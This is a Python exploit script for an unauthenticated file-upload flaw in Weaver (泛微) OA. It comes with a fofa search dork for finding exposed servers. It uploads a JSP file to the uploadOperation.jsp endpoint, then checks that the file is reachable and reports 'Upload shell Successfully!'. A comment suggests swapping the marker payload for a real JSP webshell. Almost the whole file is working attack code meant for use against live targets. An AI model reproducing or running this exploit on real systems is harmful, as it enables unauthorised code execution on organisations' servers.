#!/usr/bin/python3
#Author 9527
#fofa dork: fofa app="Weaver-OA"
#上传webshell好像还不得行，可以把data的里jspshell换成其他的，有点鸡肋

import requests
import sys
import os
from urllib3.exceptions import InsecureRequestWarning
from scripts import printColor

def check(ip):

    target = ip

    requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)

    headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36",
                    "Cache-Control": "max-age=0",
                    "Upgrade-Insecure-Requests": "1",
                    "Origin": "https://www.baidu.com/",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryFy3iNVBftjP6IOwo"
                }

    PostUrl = target + '/page/exportImport/uploadOperation.jsp'

    data = "------WebKitFormBoundaryFy3iNVBftjP6IOwo\n"\
    "Content-Disposition: form-data; name=\"file\"; filename=\"asdfghjkl.jsp\"\n"\
    "Content-Type: application/octet-stream\n"\
    "\n"\
    "<%out.print(\"t00ls\");%>\n"\
    "------WebKitFormBoundaryFy3iNVBftjP6IOwo--"

    def CheckJsp():
        JspUrl = target + '/page/exportImport/fileTransfer/asdfghjkl.jsp'
        response = requests.get(url = JspUrl,headers = headers,verify = False,timeout = 10)
        if(response.status_code == 200 and 't00ls' in response.text):
            pc = printColor.Colors()
            pc.print_red_text("Upload shell Successfully!")
            print("Your shell: " + JspUrl)
        else:
            print("[-] Upload failed")
            exit()

    response = requests.post(PostUrl,data = data,headers = headers,verify = False,timeout = 10)

    if (response.status_code == 200):
        CheckJsp()
        return 1
    else:
        print("泛微OA前台上传漏洞 is not vuln!")
